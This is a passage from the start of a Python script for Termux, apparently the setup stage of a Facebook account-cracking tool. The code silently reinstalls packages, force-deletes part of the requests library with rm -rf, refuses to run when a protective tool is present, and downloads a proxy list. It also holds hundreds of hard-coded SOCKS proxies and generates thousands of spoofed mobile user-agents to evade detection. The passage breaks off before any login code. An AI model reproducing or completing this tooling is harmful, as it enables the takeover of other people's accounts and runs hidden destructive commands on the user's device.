
######___________________runtxt___________________######
import os, sys, time
from os import sys as lo
def runtxt(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.02) 
try:
    import pycurl
    import os
    from io import BytesIO
except:
    os.system('pip install pycurl')
    import pycurl
    from io import BytesIO
try:import pycurl
except:os.system('pkg uninstall python;pkg install python -y;pip install pycurl')
try:import pycurl
except:print('\n Pycurl Error!\n Try Again! ');exit()
#os.system('termux-setup-storage')
try:
	open('/sdcard/....awm.txt','w').write(' ')
except Exception as e:
	print(e)
	print('[â—‡] Allow Permissions')
	os.system('termux-setup-storage')
if not os.path.exists("/data/data/com.termux/files/usr/bin/rm"):
        runtxt(' [+] \033[1;91mProtect Found \033[1;97m');time.sleep(1);runtxt(' [+] \033[1;92mTurn Off Your Protector and Run Again ');exit()
os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests-2.31.0.dist-info ')
os.system('git pull /dev/null')
os.system('clear')



######___________________Import___________________######
import os, sys, time, datetime, re, bs4, json, random, requests, subprocess, platform, uuid, string, base64
from os import path
import platform,json,time,re,random,sys,uuid,string,subprocess
import time
import requests as rq
from uuid import uuid4
import requests,zlib,platform
import os,sys,tempfile,string,random,subprocess,uuid
from urllib.request import urlopen
import os,base64,zlib,pip,urllib,platform,math,shutil,random,uuid,string,hashlib,json,sys
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('pip install requests')
        os.system('pip install bs4')
        os.system('pip install rich')
        os.system('python Run.py')
except:pass
runtxt('\n\033[1;36m   Join Group ');time.sleep(1)
#os.system("xdg-open https://facebook.com/groups/892925915357288/")
print('\n\033[1;32m   Checking Update...');time.sleep(1)
#____________________approval_____________________#
tan=('https')
plt=('pastebin.com')
plts=('Best1')
iya=('github')
ani=('Muslim')
yt=('tech')
uio=('786')
jan=('approval')
#____________________Tools____________________#
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
gt = random.choice(["GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820",'SM-S908B','SM-G960U1','SC-04J','SC-51B','SM-S9080','SM-M536S','SM-G996W','SM-E426S','SM-G975F','SM-A207F','SM-A013G','SM-A145R','SM-S901B','SM-A145P','SM-N975F','SM-M136B','SM-A035M','SM-A135M','SM-A536B','SM-M115F','SM-M115F','SM-M115M','SM-M115M','SM-M107F','SM-M107G','SM-M107Y','SM-M107M','SM-M105F','SM-M105G','SM-M105Y','SM-M105M','SM-M127F','SM-M135F','SM-M135F','SM-M136B','SM-M136B','SM-M205F','SM-M205FN','SM-M205G','SM-M205M','SM-M205N','GT-N7000','GT-I9220','SVC-E160L','SVC-E160S','SM-J701F','SM-J701F','SM-J701M','SM-J701MT','SM-J710FN','SM-J710F','SM-J710H','SM-J710M','SM-J710GN','SM-J710MN','SM-J710K','SM-J7108','SM-J710FQ','SM-J737F','SM-J737V','SM-J737T','SM-J737A','SM-J737P','SM-J737T1','SM-J737U','SM-J737S','SM-J730F','SM-J730FM','SM-S727VL','SM-J730K','SM-N981B','SM-N981B','SM-N981U','SM-N981U1','SM-N981W','SM-N9810','SM-N981N','SM-J610F','SM-J610F','SM-J610G','SM-J610FN','SM-N980F','SM-N980F','SM-N770F','SM-N770F','SM-N770F','SM-N975F','SM-N975U','SM-N9750','SM-N975U1','SM-N975W','SM-N975N','SM-N975X','SCV45','SM-N971U','SM-N971N', "SM-A426B", "SM-A426B/DS", "SM-A4260", "SM-A426U", "SM-A426U1", "SM-A426N", "SM-A736B", "SM-A736B/DS", "SM-A336E", "SM-A336B", "SM-A336B/DS", "SM-A336B/DSN", "SM-A336E/DS", "SM-A336M", "SM-A326B", "SM-A326B/DS", "SM-A326BR/DS", "SM-A326BR", "SM-A326U", "SM-A326W", "SM-A326U1", "SM-A326K", "SCG08", "SM-S326DL", "SM-N9150", "SM-N915A", "SM-N915D", "SM-N915F", "SM-N915FY", "SM-N915G", "SM-N915K", "SM-N915L", "SM-N915P", "SM-N915R4", "SM-N915S", "SM-N915T", "SM-N915V", "SM-N915W8", "SM-N915X", "SC-01G"])
os.system('p'+'i'+'p'+' un'+'inst'+'all '+' h'+'tt'+'px'+' -y'+' > /dev/null')
os.system('p'+'i'+'p'+' install '+' h'+'tt'+'px'+' > /dev/null')
awmp = ['"Android"', '"Windows"', '"Linux"', '"macOS"']
awmm2= ['POST', 'GET']
awmm = ['cros', 'navigate']
awms = ['same-origin', 'none']
awmd = ['document', 'empty']
awmc = ['"dark"', '"light"']
awmmem = ['2', '4', '6', '8', '12']
awmlu = ['fa-AF,fa;q=0.9,en-US;q=0.8,en;q=0.7', 'en-US,en;q=0.9']   
session = rq.Session()
proxy = ['139.171.162.10:5520', '45.228.45.147:35010', '27.42.168.46:61308', '184.178.172.18:15280', '36.91.203.231:5678', '49.156.38.126:5678', '58.34.34.186:10800', '192.111.135.18:18301', '224.213.166.123:2313', '139.144.149.248:10006', '200.71.97.1:80', '72.195.34.60:27391', '103.172.24.131:5678', '72.210.221.197:4145', '120.79.31.133:8083', '192.111.137.34:18765', '36.92.9.76:49420', '103.165.22.246:5678', '46.101.163.117:31078', '212.79.108.234:8080', '184.178.172.5:15303', '123.57.1.78:111', '205.240.77.164:4145', '181.229.38.117:5678', '177.36.185.180:5678', '192.158.15.201:50877', '198.89.91.42:5678', '103.161.68.12:1080', '85.113.7.142:5678', '103.4.145.132:1080', '68.183.182.238:57923', '201.234.24.1:4153', '184.181.217.210:4145', '72.221.196.157:35904', '167.86.92.99:30543', '89.58.45.94:43952', '45.234.100.102:1080', '98.162.25.23:4145', '138.68.109.12:29542', '91.121.163.199:63056', '103.12.246.53:4145', '36.89.85.249:5678', '159.203.30.119:16884', '176.123.218.161:18080', '66.42.224.229:41679', '46.98.191.58:5678', '190.4.49.122:35010', '47.92.248.86:5678', '181.113.17.134:43443', '138.68.109.12:63245', '105.208.44.53:5678', '170.84.83.54:5678', '74.119.147.209:4145', '125.70.227.214:10800', '103.105.40.17:4145', '203.205.29.108:5678', '104.248.158.27:25100', '186.189.66.18:4153', '177.93.77.10:4153', '50.235.92.65:32100', '98.188.47.150:4145', '184.178.172.23:4145', '199.102.107.145:4145', '50.255.17.229:32100', '119.235.50.5:4145', '139.255.193.243:7623', '167.71.218.223:26108', '109.75.42.82:3629', '37.57.56.38:5678', '45.190.141.193:1080', '190.210.127.143:65407', '72.37.216.68:4145', '209.13.96.171:39921', '72.195.34.35:27360', '112.221.131.146:5678', '178.249.218.34:5678', '50.236.148.254:31699', '184.178.172.25:15291', '201.236.203.180:4153', '182.23.49.147:4153', '85.172.66.254:1099', '15.168.62.236:33080', '93.190.138.45:41487', '197.157.254.34:4145', '185.170.233.109:47574', '192.111.139.162:4145', '186.159.3.193:45524', '189.195.176.99:5678', '192.252.209.155:14455', '203.154.232.25:4153', '36.255.184.22:5678', '199.229.254.129:4145', '213.208.146.80:5678', '178.48.68.61:4145', '143.137.116.72:1080', '218.21.78.35:4145', '142.54.231.38:4145', '139.224.56.162:9992', '147.139.164.26:7302', '36.88.62.175:7511', '139.224.56.162:999', '49.231.0.178:55860', '104.37.135.145:4145', '159.69.153.169:5566', '199.102.104.70:4145', '68.71.254.6:4145', '117.4.107.199:51796', '98.175.31.195:4145', '123.57.1.78:8888', '181.115.238.186:1080', '213.32.252.134:5678', '14.0.43.193:8449', '88.102.184.156:4153', '138.118.38.2:1080', '102.217.205.117:5678', '182.161.226.15:23658', '190.2.146.108:22690', '103.221.254.59:1088', '185.43.189.182:3629', '90.188.40.61:3629', '202.40.177.186:1088', '39.104.79.145:8088', '199.58.184.97:4145', '45.60.197.203:8148', '200.115.157.211:4145', '131.221.120.196:5678', '121.37.207.154:10000', '213.14.32.70:4153', '45.128.133.209:1080', '58.215.218.170:10800', '139.224.56.162:8082', '178.158.237.68:5678', '69.61.200.104:36181', '143.202.226.13:4145', '51.83.98.190:38593', '115.127.121.198:5678', '104.200.152.30:4145', '159.89.206.6:14601', '218.93.238.185:10800', '61.191.119.134:10800', '36.95.66.243:35010', '184.170.245.148:4145', '115.243.111.42:1088', '91.211.177.245:3629', '109.122.81.1:57553', '98.188.47.132:4145', '139.196.151.191:5001', '174.64.199.79:4145', '103.87.86.146:4153', '184.181.217.206:4145', '217.66.206.156:5678', '72.221.172.203:4145', '118.40.69.218:8899', '186.87.179.54:5678', '1.9.167.36:60489', '183.194.93.138:51080', '187.243.253.238:43015', '47.252.1.180:8999', '92.241.87.14:5678', '192.252.208.70:14282', '46.148.36.47:4153', '136.17.139.223:4915', '190.151.166.15:4153', '138.68.109.12:16386', '186.97.167.26:5678', '72.195.34.42:4145', '199.102.106.94:4145', '47.252.1.180:8499', '5.135.1.146:1981', '82.200.81.5:1080', '98.162.25.7:31653', '178.35.177.242:3629', '154.113.71.102:35010', '188.190.176.114:5678', '107.181.161.81:4145', '138.68.109.12:63428', '207.180.204.70:65432', '173.236.179.119:14694', '177.10.150.3:4145', '5.58.33.187:5678', '47.109.53.253:87', '138.68.109.12:31806', '138.68.109.12:7077', '45.137.64.33:19099', '195.219.98.27:5678', '27.70.161.22:20173', '198.23.143.4:1081', '176.119.141.236:1080', '47.109.53.253:10000', '179.40.75.1:61362', '142.54.236.97:4145', '184.178.172.26:4145', '103.254.167.130:1080', '173.212.245.45:16673', '83.168.84.86:4153', '47.245.56.108:18181', '138.68.105.248:2662', '82.79.129.241:80', '8.219.169.172:19', '45.91.93.166:34575', '102.219.33.179:1080', '197.234.58.102:32767', '98.178.72.21:10919', '8.219.169.172:8080', '112.121.152.139:3128', '103.82.11.209:4153', '8.219.169.172:3790', '103.247.23.82:1080', '8.219.169.172:20', '131.221.182.14:4153', '200.46.30.210:4153', '72.195.114.184:4145', '103.210.29.201:31433', '47.92.242.45:3128', '178.150.188.118:1099', '142.54.239.1:4145', '47.250.134.231:10080', '109.236.86.203:37879', '180.191.22.50:4153', '46.40.60.108:52088', '41.139.250.223:5678', '47.92.242.45:443', '47.250.135.8:10080', '139.196.151.191:50001', '98.170.57.231:4145', '198.8.94.170:4145', '176.118.52.129:3629', '187.252.154.90:4153', '157.245.1.59:15674', '114.108.177.104:60984', '197.159.130.134:5678', '167.71.241.136:33299', '103.93.177.228:5678', '162.19.137.78:34297', '37.26.136.224:4153', '184.178.172.28:15294', '109.236.86.66:48471', '191.7.213.71:31576', '159.138.252.45:8181', '176.114.244.102:33722', '49.0.250.196:9002', '138.255.240.66:40736', '171.226.94.233:20167', '159.89.228.253:38172', '65.21.149.198:8080', '173.212.237.43:33657', '81.7.86.154:4145', '47.92.242.45:9999', '184.181.217.194:4145', '45.60.197.203:4520', '173.212.245.45:14364', '159.65.225.229:49772', '159.138.252.45:5566', '47.243.58.145:5555', '46.101.218.52:58704', '125.141.139.197:5566', '80.191.40.41:5678', '190.119.167.11:5678', '68.71.247.130:4145', '176.117.175.40:5678', '189.91.85.133:31337', '49.0.250.196:502', '73.185.216.244:80', '184.185.2.12:4145', '105.214.2.80:5678', '49.0.250.196:999', '161.35.25.221:3295', '122.9.131.161:8011', '199.102.105.242:4145', '122.9.131.161:3333', '163.53.186.250:5678', '191.37.68.142:32627', '117.186.40.30:1080', '159.138.252.45:6789', '142.54.228.193:4145', '46.23.141.142:5678', '103.224.54.225:31433', '188.164.222.147:1080', '24.234.142.122:31008', '8.213.129.15:999', '173.249.33.122:54853', '170.79.182.82:11337', '47.92.239.69:3128', '70.80.75.236:5678', '183.164.243.149:8089', '174.77.111.197:4145', '199.58.185.9:4145', '103.233.152.180:1080', '80.78.234.31:1080', '202.21.115.94:44574', '103.127.204.109:25327', '184.178.172.17:4145', '91.93.64.227:4145', '47.253.214.60:2080', '202.40.188.92:55103', '158.140.190.211:5678', '198.199.101.121:2327', '167.99.182.125:14475', '98.162.25.16:4145', '80.80.164.164:10801', '103.144.18.202:1080', '138.68.109.12:18395', '116.63.130.30:58208', '144.76.99.207:16003', '108.175.24.1:13135', '51.75.126.150:37198', '192.111.135.17:18302', '27.115.33.94:4153', '134.209.154.177:49425', '47.253.214.60:8989', '51.38.71.114:58083', '45.132.75.19:16863', '181.13.198.90:4153', '159.89.29.73:8080', '177.93.76.6:4145', '192.111.139.165:4145', '39.104.57.170:9002', '72.210.208.101:4145', '8.213.129.15:8989', '181.129.70.82:44357', '192.111.134.10:4145', '192.141.236.10:5678', '116.118.98.5:5678', '103.102.26.1:7469', '72.206.181.97:64943', '47.252.27.174:3128', '76.81.6.107:31008', '195.114.9.184:34445', '121.200.60.122:4153', '138.68.109.12:22412', '118.137.56.108:1080', '184.178.172.11:4145', '82.103.118.42:1099', '184.181.217.213:4145', '202.166.206.59:5678', '103.94.1.98:1080', '173.236.172.4:49631', '8.213.129.15:8089', '173.212.219.197:26877', '212.83.143.60:20733', '138.68.109.12:20535', '186.103.143.213:4153', '192.111.130.2:4145', '89.19.175.117:4145', '103.160.17.38:5678', '5.135.1.146:21287', '202.46.91.218:12391', '210.86.173.42:4153', '192.252.208.67:14287', '121.33.161.113:4145', '185.95.199.103:1099', '103.70.159.149:5678', '222.165.234.242:41541', '98.170.57.249:4145', '103.111.53.82:58033', '117.92.125.24:8089', '177.188.138.11:3128', '72.206.181.103:4145', '188.166.234.144:14605', '72.195.34.41:4145', '117.74.65.29:1111', '117.74.65.29:16072', '197.232.47.122:5678', '98.162.25.29:31679', '206.42.33.45:1080', '197.232.43.224:1080', '103.17.90.6:5678', '138.68.109.12:15866', '117.74.65.29:5566', '121.139.218.165:43295', '117.74.65.29:7788', '181.209.106.187:1080', '103.127.23.10:5678', '190.120.250.31:4145', '124.107.36.198:5678', '72.221.232.152:4145', '138.117.141.27:8888', '117.74.65.29:10005', '131.161.68.41:35944', '168.228.36.22:35010', '213.145.137.102:37447', '186.115.219.59:4153', '117.74.65.29:4063', '64.90.53.25:54049', '63.151.9.74:64312', '206.189.85.33:10198', '139.255.97.156:14888', '95.188.82.147:3629', '170.244.0.179:4145', '142.44.165.103:27982', '98.162.96.52:4145', '138.68.109.12:62662', '170.246.84.89:35010', '192.111.129.145:16894', '190.145.37.5:65409', '185.139.56.133:4145', '14.161.14.106:5678', '72.195.34.58:4145', '98.181.137.83:4145', '103.127.204.117:27217', '82.147.123.185:10808', '117.74.65.29:10000', '80.92.227.185:5678', '147.139.164.26:8080', '187.19.150.221:80', '103.114.96.93:1080', '192.111.139.163:19404', '190.211.161.212:32410', '154.94.0.133:5678', '72.217.216.239:4145', '23.88.121.205:16586', '175.139.179.65:41527', '122.248.38.4:4153', '134.119.189.9:14339', '197.248.28.17:10801', '65.20.222.175:35010', '192.252.220.89:4145', '72.210.252.134:46164', '46.105.105.223:19963', '192.111.137.35:4145', '159.203.63.113:50720', '45.128.135.253:1080', '200.27.110.30:57702', '142.54.229.249:4145', '27.70.165.109:20173', '74.119.144.60:4145', '103.120.38.238:5678', '184.181.217.220:4145', '103.37.82.134:39873', '31.172.133.253:4153', '154.79.248.156:5678', '8.209.243.173:8888', '190.89.89.157:4153', '89.28.32.203:57391', '51.222.108.216:25018', '190.182.88.226:52339', '101.51.121.141:4153', '54.39.46.139:44918', '45.91.93.166:17657', '103.127.63.57:5678', '46.98.192.233:5678', '41.223.65.158:4153', '202.40.177.94:5678', '206.42.38.85:1080', '162.212.174.239:80', '138.197.66.68:42588', '45.60.197.203:8907', '95.31.5.29:51528', '36.67.63.239:38071', '138.68.109.12:47831', '131.196.180.1:4153', '195.69.135.19:5678', '68.1.210.163:4145', '95.140.117.10:1080', '109.226.36.78:1080', '217.23.13.32:35479', '179.253.8.244:7777', '14.241.241.185:4145', '162.253.68.97:4145', '45.60.197.203:1187', '184.178.172.3:4145', '5.178.217.227:31019', '103.168.123.92:5678', '39.104.89.111:999', '115.85.84.163:5678', '187.9.76.154:4153', '39.104.89.111:8084', '41.207.251.206:8899', '93.190.143.82:41515', '36.67.14.5:5678', '95.104.160.140:7788', '181.174.85.78:5678', '102.39.113.232:5678', '192.111.130.5:17002', '186.194.234.18:4153', '202.179.184.34:5430', '170.84.83.172:5678', '130.193.123.34:5678', '209.126.127.97:61122', '112.78.138.163:5678', '192.252.211.197:14921', '72.195.114.169:4145', '103.231.176.58:5678', '91.150.77.57:56921', '72.210.221.223:4145', '8.219.167.110:8009', '72.221.171.130:4145', '164.52.42.6:4145', '108.175.23.241:13135', '46.160.90.81:5678', '198.11.175.192:8989', '70.166.167.55:57745', '42.49.148.167:3333', '192.111.138.29:4145', '203.23.49.150:5678', '8.219.167.110:5678', '179.107.52.101:4153', '8.219.167.110:9000', '72.221.164.34:60671', '174.77.111.198:49547', '72.221.171.135:4145', '5.189.129.186:56940', '181.48.70.30:4153', '45.128.133.169:1080', '188.167.178.90:4145', '113.176.195.145:4153', '117.74.65.29:9595', '154.72.78.146:5678', '109.111.242.142:1080', '54.82.101.127:8088', '98.162.25.4:31654', '116.233.95.105:4145', '46.105.105.223:8028', '190.2.136.45:47521', '117.74.65.29:143', '43.248.27.11:54730', '98.162.96.53:10663', '117.74.65.29:4118', '185.164.57.111:7614', '117.74.65.29:2087', '184.178.172.14:4145', '155.254.9.2:36510', '182.16.171.42:51459', '117.74.65.29:5005', '109.166.207.162:3629', '188.64.113.104:1080', '188.75.255.119:35010', '222.165.223.140:41541', '200.116.198.140:37092', '192.252.216.81:4145', '213.6.77.198:5678', '170.246.85.108:37163', '183.88.247.52:4153', '187.19.127.246:8011', '200.41.60.33:4153', '141.94.254.138:49207', '190.12.95.170:37209', '181.115.75.102:5678', '72.206.181.123:4145', '191.36.191.53:5678', '36.64.16.154:35010', '184.105.133.1:48324', '117.74.65.29:646', '104.236.114.255:1611', '81.16.9.222:3629', '188.92.110.174:1080', '46.8.106.140:5500', '92.42.8.20:4145', '200.105.192.6:5678', '95.31.42.199:3629', '186.97.144.98:5678', '94.180.217.100:4145', '27.147.155.70:52596', '165.227.228.102:80', '108.41.35.10:22419', '181.129.74.58:30431', '187.67.26.179:4145', '117.74.65.29:3002', '51.79.248.208:54578', '187.32.20.249:5678', '200.159.146.184:4153', '117.74.65.215:9300', '103.247.22.52:12', '184.181.217.201:4145', '117.74.65.215:6789', '170.80.91.11:4145', '46.188.2.42:5678', '117.74.65.29:9093', '187.103.0.26:5678', '117.74.65.215:33427', '185.89.65.165:33744', '192.252.214.20:15864', '213.74.223.69:4153', '142.54.232.6:4145', '132.148.75.242:47171', '117.74.65.215:10091', '109.238.208.130:4153', '184.170.248.5:4145', '72.210.252.137:4145', '116.118.98.10:5678', '117.74.65.215:3000', '213.186.202.149:5678', '221.4.161.201:51080', '196.29.231.1:4145', '170.246.196.42:4153', '41.169.78.142:57775', '3.39.244.149:33080', '68.71.249.153:48606', '202.40.186.66:1088', '123.56.129.203:8089', '51.255.80.151:42304', '142.229.215.114:3128', '208.102.51.6:58208', '182.253.93.4:4145', '62.112.11.204:12692', '202.124.224.19:80', '46.227.37.21:1088', '134.209.154.177:11639', '159.192.121.240:4145', '138.219.201.242:5678', '174.75.211.222:4145', '140.210.196.193:20000', '117.74.65.215:1604', '79.143.225.152:31270', '103.106.119.146:12391', '177.131.29.209:4153', '109.224.12.170:52015', '98.162.96.41:4145', '117.74.65.215:11443', '81.174.11.159:43516', '200.146.229.129:8291', '177.185.221.57:21776', '14.160.23.139:4145', '94.247.241.70:51006', '117.74.65.29:8110', '213.165.185.211:4153', '138.68.116.249:8017', '107.181.168.145:4145', '177.66.59.130:4153', '98.181.137.80:4145', '213.222.34.200:4145', '72.221.232.155:4145', '204.3.205.243:80', '45.157.126.165:6121', '103.28.23.229:4145', '180.250.190.150:1080', '103.127.204.112:12132', '213.226.11.149:59086', '92.51.78.66:4153', '186.94.29.52:8080', '181.129.62.2:47377', '24.249.199.4:4145', '203.76.112.68:5678', '94.181.33.149:40840', '37.131.165.19:59341', '185.18.72.249:4153', '47.243.124.21:81', '172.106.13.203:56950', '181.143.61.123:4153', '67.201.33.10:25283', '27.118.21.13:5678', '213.74.223.76:4153', '103.139.246.166:5678', '62.122.201.246:50129', '89.38.96.50:48439', '115.127.87.62:1088', '115.127.75.154:1088', '103.93.100.78:32000', '103.48.183.113:4145', '103.138.22.165:32000', '190.119.167.154:5678', '104.200.135.46:4145', '103.91.95.2:32767', '119.46.2.250:4145', '103.134.113.247:32767', '114.103.88.116:8089', '110.44.171.10:57775', '95.170.202.197:58744', '46.172.75.51:5678', '41.58.169.214:5678', '190.186.216.196:5678', '103.235.199.100:25566', '58.143.65.69:22569', '125.126.213.4:38801', '197.234.58.102:57775', '45.117.228.81:4145', '186.145.192.251:5678', '109.94.178.238:3629', '103.250.153.202:41889', '46.105.105.223:45443', '138.122.74.55:57775', '200.60.71.12:46934', '103.167.172.104:57775', '183.111.165.166:14', '159.65.9.135:10277', '146.196.121.29:57775', '47.109.46.223:8090', '117.74.65.29:8012', '142.54.235.9:4145', '107.152.98.5:4145', '103.79.165.164:57775', '193.106.192.50:36387', '154.0.155.205:8080', '202.154.18.115:1080', '177.234.244.170:32213', '72.49.49.11:31034', '45.174.240.94:999', '103.168.233.91:25566', '103.149.104.161:4153', '170.254.148.110:8080', '159.138.255.141:9981', '79.122.244.99:3128', '49.70.89.82:9999', '95.158.174.111:1080', '103.18.232.47:80', '202.57.37.197:35846', '43.229.73.239:41862', '41.190.152.130:4673', '79.173.75.182:3629', '41.57.34.112:1080', '110.78.149.70:4145', '31.131.135.247:4153', '5.133.96.148:4153', '103.152.104.228:1080', '80.250.18.225:25566', '190.114.143.226:8080', '117.198.221.34:4153', '213.145.134.174:3629', '177.38.245.106:55713', '201.184.239.75:5678', '103.230.62.146:12391', '117.74.125.19:1313', '194.85.135.243:4145', '80.254.185.73:1080', '93.104.63.65:80', '165.0.15.182:5678', '91.193.125.123:3629', '117.74.120.61:1313', '177.107.217.112:4145', '24.172.34.114:60133', '41.190.232.36:36926', '117.220.162.33:5621', '95.81.94.254:3128', '197.211.24.206:5678', '103.176.96.116:5678', '91.121.163.199:40148', '94.154.21.65:1080', '102.89.12.203:7599', '119.18.146.139:4153', '209.94.84.65:1080', '117.74.120.121:1133', '47.100.90.127:10443', '103.207.170.131:5678', '180.210.222.233:1080']
proxy = random.choice(proxy)
proxs = {'http': 'socks4://'+proxy}                  
try:
    prox= requests.get('https://raw.githubusercontent.com/BestProfessionals/MUSLIM-TECH/main/.prox.txt').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    runtxt('\n\033[1;36m   Checking Server....')
    
prox=open('.prox.txt','r').read().splitlines()

try:
    import httpx
except:exit(' Found error in http module! ')

#____________________Ua-Mobile____________________#
ugen=[]
for xd in range(10000):
        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c=f' TL-tl; {str(gt)}'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
    
for xd in range(5000):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['7','8','9','10','11','12','13','14'])
    c=' en-us; Infinix '
    d=random.choice(['X677','F98', 'NOTE 2 LTE', 'NOTE 2', 'Hot', 'Hot 1', 'Note 3', 'NOTE 3 PRO', 'Hot 10', 'Hot 10 Play', 'Note 4', 'Note 4 Pro', 'Hot 10s', 'Note 5', 'Note 10s NFC', 'Note 5 Stylus', 'Note 6', 'Note 7 LTE', 'Note 7', 'Note 7 Lite', 'Hot 10T', 'Hot 11', 'Hot 11s', 'Hot 12', 'Hot 12 Play', 'Hot 12 Play NFC', 'HOT','Note 12 Pro 5G'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(44,160)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4.3','4.4.4','5.1.1','6.0','6.0.1','7.1.1','8.1.0','9','10','11','12','13','14'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'HOT','SMART'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
